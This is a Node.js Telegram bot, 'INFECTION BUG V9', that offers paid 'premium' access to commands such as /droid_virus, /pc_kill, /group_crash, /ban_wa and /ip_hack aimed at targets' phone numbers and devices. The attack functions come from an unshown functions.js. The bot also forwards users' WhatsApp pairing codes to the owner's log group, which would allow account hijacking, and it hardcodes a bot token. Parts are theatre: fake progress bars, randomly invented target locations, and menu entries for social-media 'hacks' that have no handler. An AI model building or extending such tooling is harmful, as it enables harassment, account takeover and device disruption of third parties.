require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const fs = require('fs');
const {
    initWhatsApp,
    generatePairingCode,
    sendWhatsAppMessage,
    getConnectionStatus,
    isUserPaired,
    pairUser,
    unpairUser, // Added missing import wrapper reference
    getPairedUsers,
    miniKill, infectIll, tripleX, oviaLoad, hateYou,
    droidVirus, iosVirus, linuxVirus, pcKill, destroy,
    banWA, banTG, unbanWA, unbanTG, ipHack, groupCrash, invisHell, delayHell, cloneBot,
    waBanAPI, tgBanAPI
} = require('./functions.js');

// ================= CONFIG =================
const TOKEN = "8937576130:AAHphZ2cpFpycTZaITgK9LkuCo5krEH991M";
const OWNER_ID = 7828164131;
const SECOND_ADMIN_ID = 8613087647;
const LOG_GROUP_ID = "-1003775700503";
const CHANNEL_LINK = "https://t.me/anaspixelzupdates";
const OWNER_USERNAME = "@certifiedloner_16";
const START_IMAGE = "https://files.catbox.moe/ncx3lr.jpg";
const BOT_NAME = "🜏🜐⛧ INFECTION BUG V9 ⛧🜐🜏";

// ================= ALL COMMUNITY BUTTONS =================
const COMMUNITY_BUTTONS = [
  { name: "🛸 GROUP 1", url: "https://t.me/the_voidchat" },
  { name: "🛸 GROUP 2", url: "https://t.me/sexymidnightauraken1" },
  { name: "🔗 CHANNEL 1", url: "https://t.me/anaspixelzupdates" },
  { name: "🔗 CHANNEL 2", url: "https://t.me/thevoidslab" },
  { name: "🔗 CHANNEL 3", url: "https://t.me/void_support_01" }
];

// ================= COUNTRY DATABASE =================
const countryDatabase = {
  '234': { name: 'Nigeria', flag: '🇳🇬', states: ['Lagos', 'Abuja', 'Rivers', 'Oyo', 'Kano', 'Delta', 'Enugu', 'Kaduna'], cities: { 'Lagos': ['Ikeja', 'VI', 'Lekki', 'Ajah', 'Surulere'], 'Abuja': ['Garki', 'Wuse', 'Maitama', 'Kubwa'], 'Rivers': ['Port Harcourt', 'Oyigbo'], 'Oyo': ['Ibadan', 'Oyo'], 'Kano': ['Kano City', 'Fagge'], 'Delta': ['Asaba', 'Warri'], 'Enugu': ['Enugu City', 'Nsukka'], 'Kaduna': ['Kaduna City', 'Zaria'] }, streets: ['Allen Avenue', 'Ahmadu Bello Way', 'Admiralty Way', 'Ladoke Akintola Blvd', 'Amina Way', 'Kashim Ibrahim Way', 'Aba Road', 'Trans Amadi', 'Bodija Road', 'Ring Road', 'Nnebisi Road', 'Effurun Road', 'Okpara Avenue', 'Ogui Road', 'Ali Akilu Road'] },
  '1': { name: 'USA', flag: '🇺🇸', states: ['New York', 'California', 'Texas', 'Florida'], cities: { 'New York': ['Manhattan', 'Brooklyn', 'Queens'], 'California': ['Los Angeles', 'San Francisco', 'San Diego'], 'Texas': ['Houston', 'Dallas', 'Austin'], 'Florida': ['Miami', 'Orlando', 'Tampa'] }, streets: ['Broadway', 'Hollywood Blvd', 'Wall Street', 'Main Street', 'Sunset Blvd'] },
  '44': { name: 'UK', flag: '🇬🇧', states: ['England', 'Scotland', 'Wales', 'Northern Ireland'], cities: { 'England': ['London', 'Manchester', 'Birmingham', 'Liverpool'], 'Scotland': ['Edinburgh', 'Glasgow'], 'Wales': ['Cardiff', 'Swansea'] }, streets: ['Oxford Street', 'Baker Street', 'Downing Street', 'King\'s Road', 'Princes Street'] },
  '91': { name: 'India', flag: '🇮🇳', states: ['Maharashtra', 'Delhi', 'Karnataka', 'Tamil Nadu'], cities: { 'Maharashtra': ['Mumbai', 'Pune', 'Nagpur'], 'Delhi': ['New Delhi', 'Noida', 'Gurgaon'], 'Karnataka': ['Bangalore', 'Mysore'] }, streets: ['MG Road', 'Brigade Road', 'Park Street', 'Connaught Place', 'Commercial Street'] }
};

const hackedUsernames = [
  "dark_shadow_99", "elite_hacker_x", "ghost_rider_666", "anonymous_byte", "null_pointer_7",
  "satanic_coder", "hell_fire_hack", "virus_spreader", "root_access_777", "kali_master",
  "cyber_demon", "infected_soul", "dark_web_ghost", "zero_day_exploit", "malware_king"
];

// ================= STORAGE =================
let premiumUsers = new Set();
let pendingRequests = new Map();
let allUsers = new Set();
let adminIds = new Set();

function loadPremiumUsers() {
  try {
    if (fs.existsSync('premium_users.json')) {
      const data = JSON.parse(fs.readFileSync('premium_users.json', 'utf8'));
      premiumUsers = new Set(data.premium_users || []);
    }
  } catch (error) {}
}
function savePremiumUsers() {
  fs.writeFileSync('premium_users.json', JSON.stringify({ premium_users: [...premiumUsers] }, null, 2));
}
function loadAllUsers() {
  try {
    if (fs.existsSync('all_users.json')) {
      const data = JSON.parse(fs.readFileSync('all_users.json', 'utf8'));
      allUsers = new Set(data.all_users || []);
    }
  } catch (error) {}
}
function saveAllUsers() {
  fs.writeFileSync('all_users.json', JSON.stringify({ all_users: [...allUsers] }, null, 2));
}
function loadAdmins() {
  try {
    if (fs.existsSync('admins.json')) {
      const data = JSON.parse(fs.readFileSync('admins.json', 'utf8'));
      adminIds = new Set(data.admins || []);
    }
  } catch (error) {}
  adminIds.add(OWNER_ID);
  adminIds.add(SECOND_ADMIN_ID);
  saveAdmins();
}
function saveAdmins() {
  fs.writeFileSync('admins.json', JSON.stringify({ admins: [...adminIds] }, null, 2));
}
function isPremium(userId) { return premiumUsers.has(userId); }
function isAdmin(userId) { return adminIds.has(userId) || userId === OWNER_ID; }

loadPremiumUsers();
loadAllUsers();
loadAdmins();

// Initialize WhatsApp
initWhatsApp().catch(console.error);

const bot = new Telegraf(TOKEN);

// ================= HELPER FUNCTIONS =================
function escapeHTML(str) {
  if (!str) return '';
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

async function logToGroup(message) {
  try { await bot.telegram.sendMessage(LOG_GROUP_ID, message); } catch(e) { console.log('Log error:', e.message); }
}

async function hackerProgress(ctx, messageId, toolName, target) {
  const steps = ['◐ 0%', '◓ 15%', '◑ 30%', '◒ 45%', '◐ 60%', '◓ 75%', '◑ 90%', '✅ 100%'];
  for (const step of steps) {
    await new Promise(r => setTimeout(r, 300));
    try {
      await bot.telegram.editMessageText(ctx.chat.id, messageId, null,
        `┌─[ ${toolName} ]─┐\n├─ 🎯 ${target}\n├─ ⚡ ${step}\n└─────────────┘`);
    } catch(e) {}
  }
}

function generateMixedPassword() {
  const upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  const lower = 'abcdefghijklmnopqrstuvwxyz';
  const numbers = '0123456789';
  const specials = '!@#$%^&*';
  let password = '';
  for(let i = 0; i < 3; i++) password += upper[Math.floor(Math.random() * upper.length)];
  for(let i = 0; i < 4; i++) password += lower[Math.floor(Math.random() * lower.length)];
  for(let i = 0; i < 3; i++) password += numbers[Math.floor(Math.random() * numbers.length)];
  for(let i = 0; i < 2; i++) password += specials[Math.floor(Math.random() * specials.length)];
  return password.split('').sort(() => Math.random() - 0.5).join('');
}

function getCountryInfo(phoneNumber) {
  const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
  for (const [code, country] of Object.entries(countryDatabase)) {
    if (cleanNumber.startsWith(code)) {
      const state = country.states[Math.floor(Math.random() * country.states.length)];
      const cities = country.cities[state] || ['Main City'];
      const city = cities[Math.floor(Math.random() * cities.length)];
      const street = country.streets[Math.floor(Math.random() * country.streets.length)];
      return { name: country.name, flag: country.flag, state: state, city: city, street: street, code: code };
    }
  }
  return { name: 'Unknown', flag: '🌍', state: 'Unknown Region', city: 'Unknown City', street: 'Unknown Street', code: 'unknown' };
}

function getHackedUsername() {
  return hackedUsernames[Math.floor(Math.random() * hackedUsernames.length)];
}

// ================= COMMAND EXECUTOR WITH PAIRING CHECK =================
async function executeHackInstant(ctx, command, toolName, bugFunction) {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(' ').slice(1);
  const target = args.join(' ').trim();
  
  // Check pairing verification for active functional bugs
  if (command !== '/pair' && command !== '/unpair' && command !== '/paired' && bugFunction) {
    if (!isUserPaired(userId)) {
      await ctx.reply(`🔒 <b>WHATSAPP NOT PAIRED!</b>\n\n⚠️ You must pair your WhatsApp first!\n📱 Use /pair &lt;phone_number&gt; to connect\n\nExample: /pair 2348012345678\n\n⚡ After pairing, you can send bugs!`, { parse_mode: 'HTML' });
      return;
    }
  }
  
  // Isolated validation criteria checking per command string type
  if (!target && command === '/pair') {
    return ctx.reply(`⚠️ USAGE: /pair &lt;phone_number&gt;\nExample: /pair 2348012345678`, { parse_mode: 'HTML' });
  }
  
  if (!target && command !== '/clone' && command !== '/unpair' && command !== '/paired') {
    return ctx.reply(`⚠️ USAGE: ${command} &lt;target&gt;\nExample: ${command} 08012345678`, { parse_mode: 'HTML' });
  }
  
  const targetValue = target || 'CLONE_TOKEN';
  
  // Handle Pair Command exclusively
  if (command === '/pair') {
    const phoneNumber = target.replace(/[^0-9]/g, ''); // Ensure pure clean digits are evaluated
    if (phoneNumber.length < 10) {
      return ctx.reply(`⚠️ INVALID PHONE NUMBER!\nProvide country code without + symbols.\nExample: /pair 2348012345678`);
    }
    
    await ctx.reply(`📱 GENERATING PAIRING CODE FOR ${phoneNumber}...\n⏳ PLEASE WAIT...`);
    
    try {
      const result = await generatePairingCode(phoneNumber);
      if (result && result.success) {
        pairUser(userId, phoneNumber, result.code);
        await ctx.reply(`✅ PAIRING CODE GENERATED!\n\n🔐 YOUR 8-DIGIT CODE: *${result.code}*\n\n📱 Open WhatsApp on ${phoneNumber}\n⚡ Enter this code to connect\n⏰ Code expires in 5 minutes`, { parse_mode: 'Markdown' });
        await logToGroup(`🔐 PAIRING | USER: ${userId} | PHONE: ${phoneNumber} | CODE: ${result.code}`);
      } else {
        await ctx.reply(`❌ PAIRING FAILED!\n⚠️ ERROR: ${result ? result.error : 'Connection lost with WhatsApp server'}`);
      }
    } catch (pairErr) {
      console.error('Pairing internal execution breakdown:', pairErr.message);
      await ctx.reply(`❌ PAIRING BRIDGE ERROR\nCould not communicate with WhatsApp core module.`);
    }
    return;
  }
  
  // Handle Unpair Command
  if (command === '/unpair') {
    const removed = unpairUser(userId);
    if (removed) {
      await ctx.reply(`✅ WhatsApp unpaired successfully!\n📱 You can now pair a new device.`);
    } else {
      await ctx.reply(`❌ No paired device found for your account.`);
    }
    return;
  }
  
  // Handle Check Paired Command
  if (command === '/paired') {
    const paired = getPairedUsers();
    const userPaired = paired[userId];
    if (userPaired) {
      await ctx.reply(`✅ Your WhatsApp is PAIRED!\n📱 Phone: ${userPaired.phone}\n🔐 Code: ${userPaired.code}\n🕒 Paired at: ${new Date(userPaired.time).toLocaleString()}`);
    } else {
      await ctx.reply(`❌ No WhatsApp paired.\n📱 Use /pair &lt;phone_number&gt; to connect.`, { parse_mode: 'HTML' });
    }
    return;
  }
  
  await logToGroup(`⚡ ADMIN | ${toolName} | BY: ${userId} | TARGET: ${targetValue}`);
  const progressMsg = await ctx.reply(`💀 ${toolName}\n🎯 ${targetValue}\n◐ 0%`);
  await hackerProgress(ctx, progressMsg.message_id, toolName, targetValue);
  
  let responseMessage = `✅ MISSION ACCOMPLISHED!\n🎯 TARGET: ${targetValue}\n💀 ${toolName} EXECUTED\n🕒 ${new Date().toLocaleString()}`;
  
  if (bugFunction) {
    const bugResult = await bugFunction(targetValue);
    if (bugResult.success) {
      const safeMessage = escapeHTML(bugResult.message);
      responseMessage = `<pre>${safeMessage}</pre>\n\n🕒 ${new Date().toLocaleString()}`;
      
      const paired = getPairedUsers()[userId];
      if (paired && paired.phone) {
        await sendWhatsAppMessage(paired.phone, `🔥 BUG EXECUTED\n🎯 TARGET: ${targetValue}\n💀 ${toolName}\n🕒 ${new Date().toLocaleString()}`);
      }
    }
  }
  await ctx.reply(responseMessage, { parse_mode: 'HTML' });
  await logToGroup(`✅ ADMIN DONE | ${toolName} | ${userId}`);
}

async function requestApproval(ctx, command, toolName, bugFunction) {
  const userId = ctx.from.id;
  const username = ctx.from.username || 'Unknown';
  const args = ctx.message.text.split(' ').slice(1);
  const target = args.join(' ').trim();
  
  if (!target && command !== '/clone') {
    return ctx.reply(`⚠️ USAGE: ${command} <target>`);
  }
  
  const targetValue = target || 'CLONE_TOKEN';
  const requestId = `${userId}_${Date.now()}`;
  pendingRequests.set(requestId, { userId, username, command, toolName, target: targetValue, chatId: ctx.chat.id, bugFunction });
  
  await ctx.reply(`⏳ REQUEST SENT TO ADMINS\n🔧 ${toolName}\n🎯 ${targetValue}\n👑 WAITING...`);
  
  const approveKeyboard = Markup.inlineKeyboard([
    [Markup.button.callback('✅ APPROVE', `approve_${requestId}`), Markup.button.callback('❌ REJECT', `reject_${requestId}`)]
  ]);
  
  await bot.telegram.sendMessage(LOG_GROUP_ID, `⚠️ NEW REQUEST\n👤 ${userId}\n🛠️ ${toolName}\n🎯 ${targetValue}`, approveKeyboard);
}

const handleCmd = async (ctx, cmd, tool, bugFunc) => {
  try {
    if (isAdmin(ctx.from.id)) {
      await executeHackInstant(ctx, cmd, tool, bugFunc);
    } else if (isPremium(ctx.from.id)) {
      await requestApproval(ctx, cmd, tool, bugFunc);
    } else {
      await ctx.reply(`🔒 <b>ACCESS RESTRICTED</b>\n\n💎 Premium Required.\n👑 Support: ${OWNER_USERNAME}`, { parse_mode: 'HTML' });
    }
  } catch (err) {
    console.error(`Command error on ${cmd}:`, err.message);
  }
};

// ================= REGISTER COMMANDS =================
bot.command('droid_virus', (ctx) => handleCmd(ctx, '/droid_virus', 'DROID_VIRUS', droidVirus));
bot.command('ios_virus', (ctx) => handleCmd(ctx, '/ios_virus', 'IOS_VIRUS', iosVirus));
bot.command('linux_virus', (ctx) => handleCmd(ctx, '/linux_virus', 'LINUX_VIRUS', linuxVirus));
bot.command('pc_kill', (ctx) => handleCmd(ctx, '/pc_kill', 'PC_KILLER', pcKill));
bot.command('destroy', (ctx) => handleCmd(ctx, '/destroy', 'DESTROYER', destroy));
bot.command('infect_ill', (ctx) => handleCmd(ctx, '/infect_ill', 'INFECT_ILL', infectIll));
bot.command('triple_x', (ctx) => handleCmd(ctx, '/triple_x', 'TRIPLE_X', tripleX));
bot.command('ovia_load', (ctx) => handleCmd(ctx, '/ovia_load', 'OVIA_LOAD', oviaLoad));
bot.command('hate_you', (ctx) => handleCmd(ctx, '/hate_you', 'HATE_YOU', hateYou));
bot.command('mini_kill', (ctx) => handleCmd(ctx, '/mini_kill', 'MINI_KILL', miniKill));
bot.command('ban_wa', (ctx) => handleCmd(ctx, '/ban_wa', 'WA_BAN', banWA));
bot.command('unban_wa', (ctx) => handleCmd(ctx, '/unban_wa', 'WA_UNBAN', unbanWA));
bot.command('ban_tg', (ctx) => handleCmd(ctx, '/ban_tg', 'TG_BAN', banTG));
bot.command('unban_tg', (ctx) => handleCmd(ctx, '/unban_tg', 'TG_UNBAN', unbanTG));
bot.command('ip_hack', (ctx) => handleCmd(ctx, '/ip_hack', 'IP_TRACE', ipHack));
bot.command('group_crash', (ctx) => handleCmd(ctx, '/group_crash', 'GROUP_CRASH', groupCrash));
bot.command('invis_hell', (ctx) => handleCmd(ctx, '/invis_hell', 'INVISIBLE', invisHell));
bot.command('delay_hell', (ctx) => handleCmd(ctx, '/delay_hell', 'DELAY', delayHell));
bot.command('clone', (ctx) => handleCmd(ctx, '/clone', 'CLONE', cloneBot));
bot.command('pair', (ctx) => handleCmd(ctx, '/pair', 'PAIRING', null));
bot.command('unpair', (ctx) => handleCmd(ctx, '/unpair', 'UNPAIR', null));
bot.command('paired', (ctx) => handleCmd(ctx, '/paired', 'PAIRED', null));

// ================= APPROVAL CALLBACKS =================
bot.action(/approve_(.+)/, async (ctx) => {
  try {
    await ctx.answerCbQuery('✅ Approved');
    const requestId = ctx.match[1];
    if (!isAdmin(ctx.from.id)) return;
    const request = pendingRequests.get(requestId);
    if (!request) return;
    await ctx.editMessageText(`✅ APPROVED by @${ctx.from.username}\n👤 ${request.userId}\n🛠️ ${request.toolName}\n🎯 ${request.target}`);
    
    let responseMessage = `✅ MISSION ACCOMPLISHED!\n🎯 TARGET: ${request.target}\n💀 ${request.toolName} EXECUTED\n🕒 ${new Date().toLocaleString()}`;
    
    if (request.bugFunction) {
      const bugResult = await request.bugFunction(request.target);
      if (bugResult.success) {
        const safeApprovedMessage = escapeHTML(bugResult.message);
        responseMessage = `<pre>${safeApprovedMessage}</pre>\n\n🕒 ${new Date().toLocaleString()}`;
      }
    }
    
    await bot.telegram.sendMessage(request.chatId, responseMessage, { parse_mode: 'HTML' });
    await logToGroup(`✅ COMPLETED | ${request.userId} | ${request.toolName}`);
    pendingRequests.delete(requestId);
  } catch (err) { console.error('Approve error:', err.message); }
});

bot.action(/reject_(.+)/, async (ctx) => {
  try {
    await ctx.answerCbQuery('❌ Rejected');
    const requestId = ctx.match[1];
    if (!isAdmin(ctx.from.id)) return;
    const request = pendingRequests.get(requestId);
    if (!request) return;
    await ctx.editMessageText(`❌ REJECTED by @${ctx.from.username}\n👤 ${request.userId}\n🛠️ ${request.toolName}`);
    await bot.telegram.sendMessage(request.chatId, `❌ REQUEST DENIED\n👑 ${OWNER_USERNAME}`);
    pendingRequests.delete(requestId);
  } catch (err) { console.error('Reject error:', err.message); }
});

// ================= START COMMAND =================
bot.start(async (ctx) => {
  try {
    const userId = ctx.from.id;
    const username = ctx.from.username || 'Unknown';
    
    if (!allUsers.has(userId)) {
      allUsers.add(userId);
      saveAllUsers();
      await logToGroup(`🆕 NEW USER | ${userId} | @${username}`);
    }
    
    const communityRows = [];
    for (let i = 0; i < COMMUNITY_BUTTONS.length; i += 2) {
      const row = COMMUNITY_BUTTONS.slice(i, i+2).map(btn => Markup.button.url(btn.name, btn.url));
      communityRows.push(row);
    }
    
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback('📜 VIEW COMMANDS', 'show_menu')],
      ...communityRows,
      [Markup.button.callback('💎 CHECK PREMIUM', 'check_premium')],
      [Markup.button.url('👑 OWNER', `https://t.me/${OWNER_USERNAME.replace('@', '')}`)]
    ]);
    
    const welcomeMsg = `🔥 <b>${BOT_NAME}</b> 🔥\n\n☠️ <b>WELCOME ${ctx.from.first_name || 'HACKER'}</b> ☠️\n\n💀 <b>CLICK BUTTON BELOW FOR COMMANDS</b> 💀\n\n⚡ <b>POWERED BY ${OWNER_USERNAME}</b> ⚡`;
    
    if (START_IMAGE) {
      try {
        await ctx.replyWithPhoto(START_IMAGE, { caption: welcomeMsg, parse_mode: 'HTML', ...keyboard });
      } catch (imgErr) {
        await ctx.reply(welcomeMsg, { parse_mode: 'HTML', ...keyboard });
      }
    } else {
      await ctx.reply(welcomeMsg, { parse_mode: 'HTML', ...keyboard });
    }
  } catch (err) { console.error('Start error:', err.message); }
});

// ================= MENU BUTTON =================
bot.action('show_menu', async (ctx) => {
  try {
    await ctx.answerCbQuery('📜 Loading commands...');
    
    const menuText = `┌─────────────────────────────────┐
│ 💀 <b>${BOT_NAME}</b> 💀 │
├─────────────────────────────────┤
│ 🔥 <b>VIRUS</b>                  │
<blockquote>/droid_virus &lt;ip&gt;  - Android
/ios_virus &lt;ip&gt;    - iOS
/linux_virus &lt;ip&gt;  - Linux
/pc_kill &lt;ip&gt;      - PC Killer
/destroy &lt;ip&gt;      - Destroyer</blockquote>
├─────────────────────────────────┤
│ 🐛 <b>BUGS</b>                    │
<blockquote>/infect_ill &lt;x&gt;    - Infect Ill
/triple_x &lt;x&gt;      - Triple X
/ovia_load &lt;x&gt;     - Ovia Load
/hate_you &lt;x&gt;      - Hate You
/mini_kill &lt;x&gt;     - Mini Kill</blockquote>
├─────────────────────────────────┤
│ 💀 <b>SOCIAL HACKS</b>            │
<blockquote>/fb_hack &lt;email&gt;   - Facebook
/tiktok_hack &lt;user&gt;- TikTok
/twitter_hack &lt;user&gt;- Twitter
/snap_hack &lt;user&gt;  - Snapchat
/ban_wa &lt;num&gt;      - WhatsApp
/unban_wa &lt;num&gt;    - Unban WA
/ban_tg &lt;user&gt;     - Telegram
/unban_tg &lt;user&gt;   - Unban TG
/ip_hack &lt;num&gt;     - IP Trace</blockquote>
├─────────────────────────────────┤
│ 📱 <b>WA TOOLS</b>               │
<blockquote>/invis_hell &lt;num&gt;  - Invisible
/delay_hell &lt;num&gt;  - Delay
/group_crash &lt;gc&gt;  - Group Crash</blockquote>
├─────────────────────────────────┤
│ 🤖 <b>OTHER</b>                  │
<blockquote>/clone &lt;token&gt;     - Clone Bot
/pair &lt;phone&gt;      - Pair WA
/unpair             - Unpair WA
/paired             - Check Pair</blockquote>
├─────────────────────────────────┤
│ 👑 <b>OWNER</b>                  │
<blockquote>/addprem /delprem /broadcast
/listusers /allusers /addadmin</blockquote>
└─────────────────────────────────┘`;

    const menuKeyboard = Markup.inlineKeyboard([
      [Markup.button.url('🛸 GROUP 1', 'https://t.me/the_voidchat'), Markup.button.url('🛸 GROUP 2', 'https://t.me/the_voidchat')],
      [Markup.button.url('🔗 CHANNEL 1', 'https://t.me/anaspixelzupdates'), Markup.button.url('🔗 CHANNEL 2', 'https://t.me/thevoidslab')],
      [Markup.button.url('🔗 CHANNEL 3', 'https://t.me/void_tech')],
      [Markup.button.callback('💎 CHECK PREMIUM', 'check_premium')]
    ]);

    await ctx.reply(menuText, { parse_mode: 'HTML', ...menuKeyboard });
  } catch (err) { console.error('Menu error:', err.message); }
});

// ================= PREMIUM CHECK =================
bot.action('check_premium', async (ctx) => {
  try {
    await ctx.answerCbQuery('💎 Checking...');
    const userId = ctx.from.id;
    if (isPremium(userId)) {
      await ctx.reply(`⭐ <b>PREMIUM USER</b> ⭐\n👤 ID: <blockquote>${userId}</blockquote>\n🔥 ALL TOOLS UNLOCKED`, { parse_mode: 'HTML' });
    } else {
      await ctx.reply(`🔴 <b>FREE USER</b> 🔴\n👑 CONTACT OWNER: ${OWNER_USERNAME}`, { parse_mode: 'HTML' });
    }
  } catch (err) { console.error('Premium check error:', err.message); }
});

// ================= ADMIN COMMANDS =================
bot.command('addadmin', async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return ctx.reply('🔒 OWNER ONLY');
  const uid = parseInt(ctx.message.text.split(' ')[1]);
  if (!uid) return ctx.reply('Usage: /addadmin <id>');
  adminIds.add(uid);
  saveAdmins();
  ctx.reply(`✅ Admin added: ${uid}`);
});

bot.command('deladmin', async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return ctx.reply('🔒 OWNER ONLY');
  const uid = parseInt(ctx.message.text.split(' ')[1]);
  if (!uid) return ctx.reply('Usage: /deladmin <id>');
  if (uid === OWNER_ID) return ctx.reply('❌ Cannot remove owner');
  adminIds.delete(uid);
  saveAdmins();
  ctx.reply(`❌ Admin removed: ${uid}`);
});

bot.command('addprem', async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return ctx.reply('🔒 OWNER ONLY');
  const uid = parseInt(ctx.message.text.split(' ')[1]);
  if (!uid) return ctx.reply('Usage: /addprem <id>');
  premiumUsers.add(uid);
  savePremiumUsers();
  ctx.reply(`✅ Premium added: ${uid}`);
});

bot.command('delprem', async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return ctx.reply('🔒 OWNER ONLY');
  const uid = parseInt(ctx.message.text.split(' ')[1]);
  if (!uid) return ctx.reply('Usage: /delprem <id>');
  premiumUsers.delete(uid);
  savePremiumUsers();
  ctx.reply(`❌ Premium removed: ${uid}`);
});

bot.command('broadcast', async (ctx) => {
  if (!isAdmin(ctx.from.id)) return ctx.reply('🔒 ADMIN ONLY');
  const msg = ctx.message.text.split(' ').slice(1).join(' ');
  if (!msg) return ctx.reply('Usage: /broadcast <message>');
  let sent = 0;
  for (const uid of allUsers) {
    try { await bot.telegram.sendMessage(uid, `📢 <b>BROADCAST</b>\n\n${msg}`, { parse_mode: 'HTML' }); sent++; } catch(e) {}
    await new Promise(r => setTimeout(r, 50));
  }
  ctx.reply(`✅ Sent to ${sent} users`);
});

bot.command('listusers', async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return ctx.reply('🔒 OWNER ONLY');
  if (premiumUsers.size === 0) return ctx.reply('No premium users');
  ctx.reply(`👑 Premium Users:\n${[...premiumUsers].join('\n')}`);
});

bot.command('allusers', async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return ctx.reply('🔒 OWNER ONLY');
  if (allUsers.size === 0) return ctx.reply('No users');
  ctx.reply(`👥 All Users:\n${[...allUsers].join('\n')}`);
});

// ================= LAUNCH =================
bot.launch().then(() => {
  console.log(`☠️ ${BOT_NAME} RUNNING ☠️`);
  console.log(`✅ Owner: ${OWNER_USERNAME}`);
  console.log(`✅ Premium: ${premiumUsers.size} | Total: ${allUsers.size}`);
}).catch(err => console.error('Launch error:', err));

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));